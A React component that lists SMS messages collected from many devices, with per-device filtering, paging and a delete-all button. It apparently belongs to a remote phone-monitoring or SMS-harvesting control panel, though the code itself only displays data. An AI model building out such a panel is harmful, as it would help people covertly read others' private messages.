"use client";
import React, { useState } from "react";

export default function SmsPanel({ data, deleteAllSms, showToast }) {
  const [filterDevice, setFilterDevice] = useState(null);
  const [limit, setLimit] = useState(15);

  let allMessages = [];
  const smsData = data.user_sms || {};

  Object.keys(smsData).forEach(devId => {
    if (filterDevice && filterDevice !== devId) return;
    const msgs = smsData[devId];
    if (msgs) {
      Object.keys(msgs).forEach(k => {
        allMessages.push({
          deviceId: devId,
          ...msgs[k],
          _timestamp: msgs[k].timestamp || msgs[k].date || 0
        });
      });
    }
  });

  allMessages.sort((a, b) => b._timestamp - a._timestamp);
  const displayList = allMessages.slice(0, limit);

  return (
    <div className="panel active">
      <div className="panel-header">
        <div>
          <h2><i className="fas fa-envelope" style={{ color: "var(--gold)" }}></i> All Messages</h2>
          <p className="panel-sub">Stream of messages across all devices</p>
        </div>
        <div className="panel-stats">
          <span className="stat-item"><i className="fas fa-envelope"></i> {allMessages.length}</span>
          {filterDevice && (
            <button className="btn-sm" style={{ background: "var(--red)", color: "#fff" }} onClick={() => setFilterDevice(null)}>
              Clear Filter
            </button>
          )}
          <button className="btn-delete-all" onClick={deleteAllSms}><i className="fas fa-trash-alt"></i> Delete All</button>
        </div>
      </div>

      <div className="sms-list-luxury">
        {displayList.map((msg, i) => (
          <div key={i} className="sms-card-luxury">
            <div className="sms-header">
              <span className="sms-sender">
                <span className="device-tag" onClick={() => { setFilterDevice(msg.deviceId); showToast(`Filtering ${msg.deviceId}`, "info"); }}>
                  [{msg.deviceId}]
                </span> 👤 {msg.sender || msg.address || "Unknown"}
              </span>
              <span className="sms-meta">{msg.date_formatted || msg.date || ""}</span>
            </div>
            <div className="sms-body">{msg.body || msg.message}</div>
          </div>
        ))}
      </div>

      {limit < allMessages.length && (
        <button className="btn-load-more" onClick={() => setLimit(l => l + 15)}>
          <i className="fas fa-chevron-down"></i> Load More Messages ({allMessages.length - limit} left)
        </button>
      )}
    </div>
  );
}
